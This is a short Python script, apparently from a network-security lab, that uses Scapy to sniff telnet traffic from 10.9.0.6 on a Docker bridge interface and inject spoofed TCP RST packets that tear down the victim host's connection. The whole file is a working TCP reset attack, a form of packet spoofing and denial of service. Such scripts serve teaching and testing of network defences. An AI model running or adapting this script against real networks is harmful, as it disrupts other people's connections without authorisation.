#!/usr/bin/env python3

from scapy.all import *

def send_rst(pkt):
    print("SENDING RESET PACKET..........")
    #sniffing packet from server/end host 10.9.0.6 -> 10.9.0.5
    #sending packet as user/victim 10.9.0.5
    ip = IP(src=pkt[IP].dst, dst=pkt[IP].src) #rstPkt.src = 10.9.0.5 rstPkt.dst = 10.9.0.6
    tcp = TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags="R", seq=pkt[TCP].ack, ack=pkt[TCP].seq)
    rstPkt = ip/tcp
    #ls(rstPkt)
    send(rstPkt, verbose=0)

pkt = sniff(iface="br-14fcdedbf20a", filter="tcp and src host 10.9.0.6 and src port 23", prn=send_rst)
